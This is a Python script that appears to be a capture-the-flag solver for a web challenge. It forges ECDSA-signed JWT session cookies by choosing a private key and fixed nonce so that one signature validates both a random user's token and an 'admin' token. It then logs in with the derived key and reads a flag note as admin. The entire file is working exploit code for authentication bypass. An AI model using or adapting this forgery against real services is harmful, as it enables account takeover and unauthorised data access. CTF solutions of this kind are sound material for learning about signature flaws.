#!/usr/bin/env python3

import sys
import json
import typing
import base64
import hashlib
import secrets
import asyncio
import aiohttp

from fastecdsa.keys import export_key, get_public_key
from fastecdsa.curve import P256

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization 
from cryptography.hazmat.primitives.serialization import ssh


CURVE = P256
HASHFUNC = hashlib.sha256


def obj_to_data(obj: dict) -> bytes:
    return json.dumps(obj, separators=(',', ':')).encode()


def data_to_base64(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().strip('=')


def create_message_from_data(data: bytes) -> int:
    hashval = HASHFUNC(data).digest()

    return int.from_bytes(hashval, 'big')


def create_token(r: int, s: int) -> str:
    key_size = (CURVE.q.bit_length() + 7) // 8
    token = r.to_bytes(key_size, 'big') + s.to_bytes(key_size, 'big')

    return data_to_base64(token)


def generate_parameters(message1: int, message2: int, k: int) -> typing.Tuple[int]:
    r = (k * CURVE.G).x
    d = -(message1 + message2) * pow(2 * r, -1, CURVE.q) % CURVE.q
    s = (message1 + d * r) * pow(k, -1, CURVE.q) % CURVE.q

    return d, r, s


def generate_session(payload: str, r: int, s: int) -> str:
    return f'{payload}.{create_token(r, s)}'


def generate_password(private_key: int) -> str:
    public_key = get_public_key(private_key, CURVE)
    public_key_pem = export_key(public_key, CURVE)

    public_key_obj = serialization.load_pem_public_key(
        public_key_pem.encode(), default_backend(),
    )

    return ssh.serialize_ssh_public_key(public_key_obj).decode()


def generate_solution(obj1: dict, obj2: dict) -> typing.Type[str]:
    header = {'typ': 'JWT', 'alg': 'ES256'}

    payload1 = '.'.join([
        data_to_base64(obj_to_data(header)),
        data_to_base64(obj_to_data(obj1)),
    ])

    payload2 = '.'.join([
        data_to_base64(obj_to_data(header)),
        data_to_base64(obj_to_data(obj2)),
    ])

    message1, message2 = map(
        create_message_from_data, 
        map(str.encode, [payload1, payload2]),
    )

    k = 1337
    private_key, r, s = generate_parameters(message1, message2, k)

    session1 = generate_session(payload1, r, s)
    session2 = generate_session(payload2, r, s)
    password = generate_password(private_key)

    return session1, session2, password


async def main():
    host = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
    port = 30227
    url = f'http://{host}:{port}'

    flag_note_id = 'flagflagflagflag'

    username1 = secrets.token_hex(8)
    username2 = 'admin'

    obj1 = {'username': username1}
    obj2 = {'username': username2}

    session1, session2, password = generate_solution(obj1, obj2)

    async with aiohttp.ClientSession() as session:
        login_json = {
            'username': username1,
            'password': password,
        }

        async with session.post(f'{url}/api/login/', json=login_json) as response:
            print(await response.json())

        cookies = {
            'session': session1,
        }

        async with session.get(f'{url}/api/profile/', cookies=cookies) as response:
            print(await response.json())

        cookies = {
            'session': session2,
        }

        async with session.get(f'{url}/api/note/{flag_note_id}/', cookies=cookies) as response:
            print(await response.json())


if __name__ == '__main__':
    asyncio.run(main())
